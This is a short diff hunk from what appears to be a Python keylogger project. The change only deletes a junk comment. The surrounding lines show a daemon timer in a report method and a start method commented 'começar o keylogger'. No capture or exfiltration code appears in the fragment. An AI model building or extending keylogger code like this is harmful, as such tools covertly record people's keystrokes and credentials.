@@ -59,7 +59,7 @@ def report(self):
     timer.daemon = True
     timer.start()
     
-    #ddadasdasdasdas
+
 def start(self):
     self.detector = datetime.now()
      #começar o keylogger
